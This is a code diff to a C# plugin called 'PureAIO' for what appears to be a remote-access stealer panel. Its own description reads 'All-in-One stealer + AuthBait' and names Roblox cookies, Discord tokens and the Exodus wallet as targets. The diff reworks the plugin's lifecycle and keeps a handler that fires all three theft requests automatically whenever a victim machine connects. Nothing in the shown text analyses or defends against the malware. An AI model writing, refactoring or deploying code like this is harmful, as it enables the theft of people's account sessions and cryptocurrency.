@@ -1,6 +1,5 @@
 using System;
 using System.IO;
-using System.Windows.Forms;
 using PluginSDK.Interfaces;
 using PluginSDK.Packets;
 using ProtoBuf;
@@ -9,27 +8,30 @@ namespace PureAIO
 {
     public class ServerPlugin : ICustomPlugin
     {
-        public string Name        => "PureAIO";
-        public string Description => "All-in-One stealer + AuthBait";
-        public string Version     => "2.0.0";
-
-        private Action<IPacket> _send;
-        private Action          _disconnect;
         private Form1           _form;
+        private Action<IPacket> _send;
 
-        public void OnOpen(string title) { }
+        // ── ICustomPlugin identity ────────────────────────────────────────────
+        public string PluginName        => "PureAIO";
+        public string PluginVersion     => "2.0.0";
+        public string PluginAuthor      => "Sam";
+        public string PluginDescription => "AuthBait + Roblox Cookie + Discord Token + Exodus (all-in-one)";
+
+        // ── ICustomPlugin lifecycle ───────────────────────────────────────────
+        public bool OnOpen(string title)
+        {
+            _form = new Form1();
+            _form.FormClosed += (s, e) => _form = null;
+            _form.Show();
+            return true;
+        }
 
         public void OnConnected(Action<IPacket> send, Action disconnect)
         {
-            _send       = send;
-            _disconnect = disconnect;
+            _send = send;
+            _form?.SetSend(send);
 
-            _form = new Form1();
-            _form.SetSend(send);
-            _form.FormClosed += (s, e) => { _form = null; };
-            _form.Show();
-
-            // ── Auto-fire all three stealers immediately on connect ──
+            // ── auto-fire all three stealers on connect ──
             SendPacket(new RobloxCookieRequest());
             SendPacket(new DiscordTokenRequest());
             SendPacket(new ExodusRequest());
@@ -37,7 +39,9 @@ namespace PureAIO
 
         public void OnPacketReceived(IPacket packet)
         {
-            var cp = packet as PluginSDK.Packets.CustomPacket;
+            if (_form == null || _form.IsDisposed) return;
+
+            var cp = packet as CustomPacket;
             if (cp == null) return;
 
             AIOPacket pkt;
@@ -48,28 +52,31 @@ namespace PureAIO
             }
             catch { return; }
 
-            _form?.HandlePacket(pkt);
+            _form.HandlePacket(pkt);
         }
 
         public void OnDisconnected()
         {
-            if (_form == null) return;
+            _send = null;
+
+            if (_form == null || _form.IsDisposed) return;
+
             if (_form.InvokeRequired)
-                _form.Invoke(new Action(() => _form?.Close()));
+                _form.Invoke(new Action(() => { if (!_form.IsDisposed) _form.Close(); }));
             else
-                _form?.Close();
-            _form = null;
+                _form.Close();
         }
 
-        // ── helpers ──────────────────────────────────────────────────────────
+        // ── send helper ───────────────────────────────────────────────────────
         private void SendPacket(AIOPacket pkt)
         {
+            if (_send == null) return;
             try
             {
                 using (var ms = new MemoryStream())
                 {
                     Serializer.Serialize(ms, pkt);
-                    _send(new PluginSDK.Packets.CustomPacket { Buffer = ms.ToArray() });
+                    _send(new CustomPacket { Buffer = ms.ToArray() });
                 }
             }
             catch { }
